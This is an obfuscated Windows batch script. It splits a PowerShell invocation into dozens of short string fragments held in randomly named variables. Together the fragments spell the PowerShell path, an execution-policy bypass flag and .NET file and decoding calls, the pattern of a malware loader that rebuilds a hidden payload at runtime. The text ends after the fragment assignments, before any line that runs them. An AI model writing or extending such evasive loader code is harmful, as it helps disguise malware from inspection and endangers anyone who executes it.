@echo off
set "mkMguOHRrj=Po"
set "mCgVpiGlVk=ll"
set "gncPImeMUX=ws"
set "DQoGgzwpyZ=s\"
set "mKUeEPnhcF=rS"
set "fUFbhHiapL=\W"
set "bmnHKBpIBE=\v"
set "VXGQUxlRzm=we"
set "yWHoqvwgsN=st"
set "xPkYGZyllr= /"
set "jblRDHkQUB=po"
set "eIqOwQuRIF=ow"
set "AAPMpwzbNw=1."
set "LffsdKYXtS=y "
set "jTaQYzGtbk=py"
set "JFyyHtOCGa=rs"
set "kzIYXBUajQ=nd"
set "IYshJTKAlG=Sy"
set "dpWKSYkrCo=in"
set "eECjifpjeC=32"
set "UyxFcyVCtO=he"
set "lsecBjvZoU= C"
set "imbOnMMtGT=we"
set "dMVOEBAwGh=Wi"
set "mJgmnpHJxo=ll"
set "IHJOCUuxfk=do"
set "WqTgvyoXjI=he"
set "CIyKaKEYOv=0\"
set "XlsVMDDMkk=.e"
set "SIkUEStVsO=xe"
set "TYcKZzHEIP=co"
set "hJObEukcRx=em"
set "styjisWQev=:\"
set "kRPVgQkllS=cd"
set "OLyyZgqVkq= %~dp0"
set "boCsPqodkn=stem"
set "AvklAQDhzN=oint"
set "UWAgHPFSxQ=pStr"
set "mwXDRBLfEC=ment"
set "sKLEFwdqrd=;$KI"
set "zCoBkmOYxx=bstr"
set "cNOReCsHnd=ispo"
set "WifOyJrLAn=k; }"
set "ewjeipuWyJ=.Dis"
set "gPtPtWEiPE=yhxW"
set "MSJIJRxPXv=yste"
set "xxWBRcsbFs=ddin"
set "NoDPHsQQzC=esMa"
set "pJDNOCNHzh= New"
set "wGDeyZJeGX=d;$C"
set "YrjfcfqcFu= = $"
set "dyuhOgBeLG=File"
set "FqbspLTRdV=New-"
set "vHqVuOvZka=gth)"
set "NfWpQaaPYo=..-1"
set "mudtOQaany=]::N"
set "bIREaFYLDE=New-"
set "CMoZLvjHST=ode]"
set "DPOepvuYjX=[IO."
set "cYxDJdyKgq=bypa"
set "bgjuRWTJIt=join"
set "dKIDdcvOVZ='gni"
set "UarSXTboWa=K) {"
set "AAIlSkvHLz=LrDD"
set "ztsGnXvtrs=)) {"
set "rGkGrVQVaq=y.Ci"
